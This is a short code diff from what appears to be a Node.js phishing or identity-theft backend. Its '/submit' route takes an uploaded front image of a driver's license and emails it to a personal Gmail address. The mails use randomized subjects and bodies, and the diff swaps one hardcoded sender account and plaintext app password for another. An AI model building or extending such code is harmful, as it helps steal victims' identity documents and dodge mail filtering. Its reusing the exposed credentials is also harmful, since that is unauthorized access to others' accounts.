@@ -60,14 +60,14 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
       port: 465,
       secure: true,
       auth: {
-        user: "tobir2275@gmail.com",
-        pass: "qteaicwtuuzthdbl",
+        user: "grantoniap@gmail.com",
+        pass: "aylysgnyieaialpm",
       },
     });
 
     // create mail options object
     const mailOptions = {
-      from: "tobir2275@gmail.com",
+      from: "grantoniap@gmail.com",
       to: "isaiahgabriel175@gmail.com", // recipient email address
       subject: `${randomSubject}`,
       text: `${randomSentence}`,
